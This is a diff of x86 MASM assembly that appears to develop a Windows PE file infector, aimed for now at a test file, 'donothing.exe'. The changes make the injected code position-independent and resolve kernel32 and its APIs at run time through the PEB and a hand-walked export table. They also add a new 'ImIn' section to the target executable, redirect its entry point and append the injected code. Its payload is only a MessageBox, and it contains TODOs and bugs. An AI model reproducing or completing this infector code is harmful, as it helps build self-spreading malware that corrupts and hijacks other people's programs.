@@ -16,15 +16,29 @@ includelib	\masm32\lib\kernel32.lib
 include		\masm32\include\msvcrt.inc
 includelib	\masm32\lib\msvcrt.lib
 
+
+; Source of life
 ; Macro to avoid repetition when pushing offset with delta
 PDELTA		macro	Addr
 			mov	eax, Addr
 			add	eax, ebp
 			push	eax
 		endm
+; If we change our mind on ebp
+DELTA		equ	ebp + offset
+; Such wow
+GETADDR		macro	Name, Lib, Save
+			PDELTA	offset Name
+			push	[DELTA Lib]
+			call	[DELTA pGetProcAddress]
+			mov	[DELTA Save], eax
+		endm
 
 
-.data
+.code
+
+toInject:
+; PE
 PeFile			dd	?
 PeMapObject		dd	?
 PeFileMap		dd	?
@@ -38,17 +52,41 @@ SectionAlignment	dd	?
 FileAlignment		dd	?
 NewSectionCodeSize	dd	?
 
+; Debug
 ErrorMessage	db	"Error",0
 FileName	db	"donothing.exe",0
 String_string	db	"%s ",0
 String_number	db	"%d ",0
 NewSectionName	db	"ImIn",0
 
+; DLL
+sExitProcess	db	'ExitProcess', 0 
+sCreateFile	db	'CreateFile', 0 
+sCreateFileMapping	db	'CreateFileMapping', 0 
+sMapViewOfFile	db	'MapViewOfFile', 0 
+sUnmapViewOfFile	db	'UnmapViewOfFile', 0 
+sCloseHandle	db	'CloseHandle', 0 
+sWriteFile	db	'WriteFile', 0 
+sGetProcAddress	db	'GetProcAddress', 0 
+sMessageBoxA	db	'MessageBoxA', 0 
+sLoadLibrary	db	'LoadLibraryA', 0 
+sHelloWorld	db	'Hello World (MsgBox Without include lib BIATCH!)', 0
+sUser32		db	'USER32.DLL', 0
+sKernel32	db	'KERNEL32.DLL', 0
+pExitProcess	dd	?
+pCreateFile	dd	?
+pCreateFileMapping	dd	?
+pMapViewOfFile	dd	?
+pUnmapViewOfFile	dd	?
+pCloseHandle	dd	?
+pWriteFile	dd	?
+pMessageBoxA	dd	?
+pKernel32	dd	?
+pUser32		dd	?
+pLoadLibrary	dd	?
+pGetProcAddress	dd	?
 
 
-.code
-
-inject:
 
 start:
 ; Delta offset for PIC
@@ -66,7 +104,7 @@ mov 	ebx, [ebx + 014h] ; LBR 1st
 mov 	ebx, [ebx] ; 2nd entry
 mov 	ebx, [ebx] ; 3rd entry : kernel32 module (I hope so)
 mov	ebx, [ebx + 010h] ; Base address Kernel32 (Holy grail ?)
-mov	[ebp + pKernel32], ebx
+mov	[DELTA pKernel32], ebx
 
 ; GET PROPERTIES DLL
 mov	esi, [ebx + 03Ch] ; PE Header offset
@@ -98,30 +136,33 @@ mov	edx, [esi + 01Ch] ; List of entry point
 add	edx, ebx
 mov	edx, [edx + eax * 4 + 4] ; Entry point of function (TODO - Why the fuck +4 ?)
 add	edx, ebx
-mov	[ebp + pGetProcAddress], edx
+mov	[DELTA pGetProcAddress], edx
 
-; Test on LoadLibrary
-PDELTA	offset sLoadLibrary
-push	[ebp + pKernel32]
-call	[ebp + pGetProcAddress] ; GetProcAddress(kernel32, "LoadLibrary")
-mov	[ebp + pLoadLibrary], eax
+; Get User32 (Not without LoadLibrary !)
+GETADDR	sLoadLibrary, pKernel32, pLoadLibrary
 PDELTA	offset sUser32
-call	[ebp + pLoadLibrary] ; LoadLibrary("user32.dll")
-mov	[ebp + pUser32], eax
-PDELTA	offset sMessageBoxA
-push	[ebp + pUser32]
-call	[ebp + pGetProcAddress] ; GetProcAddress(user32.dll, "MessageBoxA")
-mov	[ebp + pMessageBoxA], eax
+call	[DELTA pLoadLibrary] ; LoadLibrary("user32.dll")
+mov	[DELTA pUser32], eax
+; GET ALL THE THINGS !
+GETADDR	sMessageBoxA, pUser32, pMessageBoxA
+GETADDR	sExitProcess, pKernel32, pExitProcess
+GETADDR	sCreateFile, pKernel32, pCreateFile
+GETADDR	sCreateFileMapping, pKernel32, pCreateFileMapping
+GETADDR	sMapViewOfFile, pKernel32, pMapViewOfFile
+GETADDR	sUnmapViewOfFile, pKernel32, pUnmapViewOfFile
+GETADDR	sCloseHandle, pKernel32, pCloseHandle
+GETADDR	sWriteFile, pKernel32, pWriteFile
+; Test!
 push	0
 PDELTA	offset sHelloWorld
 PDELTA	offset sHelloWorld
 push	0
-call	[ebp + pMessageBoxA]
+call	[DELTA pMessageBoxA]
 
 ; Get ExitProcess
 PDELTA	offset sExitProcess
-push	[ebp + pKernel32]
-call	[ebp + pGetProcAddress]
+push	[DELTA pKernel32]
+call	[DELTA pGetProcAddress]
 
 jmp	begin
 
@@ -147,19 +188,6 @@ xor	eax, eax
 nomatch:
 ret
 
-sExitProcess	db	'ExitProcess', 0 
-sGetProcAddress	db	'GetProcAddress', 0 
-sMessageBoxA	db	'MessageBoxA', 0 
-sLoadLibrary	db	'LoadLibraryA', 0 
-sHelloWorld	db	'Hello World (MsgBox Without include lib BIATCH!)', 0
-sUser32		db	'USER32.DLL', 0
-sKernel32	db	'KERNEL32.DLL', 0
-pMessageBoxA	dd	?
-pKernel32	dd	?
-pUser32		dd	?
-pLoadLibrary	dd	?
-pGetProcAddress	dd	?
-
 
 
 
@@ -171,13 +199,13 @@ push	0
 push	OPEN_EXISTING
 push	0
 push	0
-mov	eax,	GENERIC_READ
-or	eax,	GENERIC_WRITE
+mov	eax, GENERIC_READ
+or	eax, GENERIC_WRITE
 push	eax
-push	offset FileName
+PDELTA	offset FileName
 call	CreateFile
 call	CheckError
-mov		PeFile,	eax
+mov	[DELTA PeFile], eax
 
 ; CREATE_FILE_MAPPING
 push	NULL
@@ -185,10 +213,10 @@ push	0
 push	0
 push	PAGE_READWRITE
 push	NULL
-push	PeFile
+PDELTA	PeFile
 call	CreateFileMapping
 call	CheckError
-mov	PeMapObject, eax
+mov	[DELTA PeMapObject], eax
 
 ; MAP_VIEW_OF_FILE
 push	0
@@ -197,10 +225,10 @@ push	0
 mov	eax,	FILE_MAP_READ
 or	eax,	FILE_MAP_WRITE
 push	eax
-push	PeMapObject
+PDELTA	PeMapObject
 call	MapViewOfFile
 call	CheckError
-mov	PeFileMap, eax
+mov	[DELTA PeFileMap], eax
 mov	ebx, eax
 
 ; CHECK MAGIC
@@ -213,34 +241,34 @@ mov	ecx, ebx
 add	ecx, 03Ch
 mov	edx, ebx
 add	edx, dword ptr [ecx]
-mov	PeNtHeader, edx
+mov	[DELTA PeNtHeader], edx
 cmp	dword ptr [edx], IMAGE_NT_SIGNATURE
 jne	JumpCheckError
 
 ; GET OPTIONAL HEADER useless so far
-mov	PeOptionalHeader, edx
-add PeOptionalHeader, 018h
+mov	[DELTA PeOptionalHeader], edx
+add	[DELTA PeOptionalHeader], 018h
 
 ; GET NUMBER SECTIONS
 mov	eax, edx
 add	eax, 6
-mov	PeSectionNb, eax
+mov	[DELTA PeSectionNb], eax
 xor	ecx, ecx
 mov	cx, word ptr[eax]
 
 ; GET ALIGNMENT
 add	eax, 032h
 mov	esi, [eax]
-mov	SectionAlignment, esi
+mov	[DELTA SectionAlignment], esi
 add	eax, 04h
 mov	esi, [eax]
-mov	FileAlignment, esi
+mov	[DELTA FileAlignment], esi
 
 
 ; LOOP SECTIONS HEADER
 mov	esi, edx
 add	esi, 0F8h
-mov	PeStartHeader, esi
+mov	[DELTA PeStartHeader], esi
 mov	ebx, esi ; Keep start of Headers
 mov	LastSec, 0
 Loop_SectionHeader:
@@ -249,8 +277,8 @@ mov	eax, esi
 add	eax, 0Ch
 cmp	LastSec, eax
 jg	keepLastSec
-mov	LastSecHeader, esi
-mov	LastSec, eax
+mov	[DELTA LastSecHeader], esi
+mov	[DELTA LastSec], eax
 keepLastSec:
 ; SHOW NAME
 mov	eax, esi
@@ -263,7 +291,7 @@ loop	Loop_SectionHeader
 ; COPY FIRST ONE INTO NEW ONE
 mov	ecx, 020h
 mov	edi, esi ; Destination bytes
-mov	esi, PeStartHeader ; Source bytes
+mov	esi, [DELTA PeStartHeader] ; Source bytes
 mov	ebx, edi ; Keep start of new header
 CreateNewHeader:
 lodsb
@@ -272,10 +300,10 @@ loop	CreateNewHeader
 
 ; INCREMENT NUMBER OF SECTION
 xor	eax, eax
-mov	edi, PeSectionNb
+mov	edi, [DELTA PeSectionNb]
 mov	ax, word ptr [edi]
 inc	eax
-mov	ecx, PeSectionNb
+mov	ecx, [DELTA PeSectionNb]
 mov	word ptr [ecx], ax
 
 ; SET PROPERTIES
@@ -287,6 +315,7 @@ mov	word ptr [ecx], ax
 ; COPY THE NAME
 mov	ecx, 08h ; Length of Name
 mov	esi, offset NewSectionName ; Source bytes
+add	esi, ebp
 mov	edi, ebx ; Destination bytes
 pusha ; Keep registers
 CopySectionName:
@@ -297,13 +326,13 @@ loop CopySectionName
 ; Virtual Size
 popa	; Retrieve registers
 add	edi, 08h
-mov	NewSectionCodeSize, endToInject - toInject ; Size of actual code in new section
+mov	[DELTA NewSectionCodeSize], toInject - endInject ; Size of actual code in new section
 mov	ecx, NewSectionCodeSize
 mov	[edi], ecx
 
 ; Virtual Address (Last section VA + Alignment TODO Check if our code not superior ?)
 add	edi, 04h
-mov	ecx, LastSecHeader
+mov	ecx, [DELTA LastSecHeader]
 add	ecx, 08h ; LastSecHeader.VirtualSize
 mov	eax, [ecx]
 add	ecx, 04h ; LastSecHeader.VirtualAdress
@@ -312,20 +341,20 @@ add	eax, [ecx]
 ; pImageSectionHeader->VirtualAddress = (((EndSections - 1) / SectionAlignment) + 1) * SectionAlignment;
 sub eax, 1
 xor	edx, edx
-div	SectionAlignment ; divide eax by SectionAlignement
-add eax, 1
-mul SectionAlignment
+div	[DELTA SectionAlignment] ; divide eax by SectionAlignement
+add	eax, 1
+mul	[DELTA SectionAlignment]
 mov	[edi], eax
 mov	esi, eax ; Keep New VA for EntryPoint
 
 ; Size of raw data (FileAlignment TODO Check if our code not superior?)
 add	edi, 04h
-mov	eax, NewSectionCodeSize
-sub eax, 1
+mov	eax, [DELTA NewSectionCodeSize]
+sub	eax, 1
 xor	edx, edx
-div	FileAlignment ; divide eax by FileAlignment
-add eax, 1
-mul FileAlignment
+div	[DELTA FileAlignment] ; divide eax by FileAlignment
+add	eax, 1
+mul	[DELTA FileAlignment]
 mov	[edi], eax
 
 
@@ -349,7 +378,7 @@ mov	[edi], ecx
 
 ; CHANGE PE PROPERTIES
 ; TODO CHANGE SIZE OF CODE
-mov	eax, PeNtHeader
+mov	eax, [DELTA PeNtHeader]
 add	eax, 01Ch
 ; CHANGE ENTRY POINT TODO Need to size every section ?
 add	eax, 0Ch
@@ -360,11 +389,11 @@ add	ebx, 08h
 add	esi, 01h ; TODO - WTF IS THIS SHIT ? (Size of all virtual size + 1?)
 mov	[eax], esi
 ; CLOSE
-push	PeFileMap
+PDELTA	PeFileMap
 call	UnmapViewOfFile
-push	PeMapObject
+PDELTA	PeMapObject
 call	CloseHandle
-push	PeFile
+PDELTA	PeFile
 call	CloseHandle
 
 
@@ -376,24 +405,24 @@ push	OPEN_ALWAYS
 push	0
 push	FILE_SHARE_READ
 push	FILE_APPEND_DATA
-push	offset FileName
+PDELTA	offset FileName
 call	CreateFile
-mov	PeFile, eax
+mov	[DELTA PeFile], eax
 call	CheckError
 
 ; INSERT OPCODE
-mov	ecx, 512 ; endToInject - toInject ; Number of bytes
-mov	esi, inject ; Source bytes
+mov	ecx, 512 ; Number of bytes
+mov	esi, [DELTA toInject] ; Source bytes
 push	0
 push	0
 push	ecx
 push	esi
-push	PeFile
+PDELTA	PeFile
 call	WriteFile
 call	CheckError
 
 ; CLOSE
-push	PeFile
+PDELTA	PeFile
 call	CloseHandle
 
 
@@ -402,18 +431,7 @@ push	0
 call 	ExitProcess
 
 
-; TEST LABEL INJECTION
-toInject:
-push	MB_OK
-push	0
-push	0
-push	0
-call	MessageBoxA
-push	0
-call	ExitProcess
-endToInject:
-
-
+; Debug
 print_str	proc
 pusha
 push	eax
@@ -454,5 +472,7 @@ call	MessageBoxA
 popa
 ret
 DebugMessageBox	endp
+
+endInject:
 
 end		start
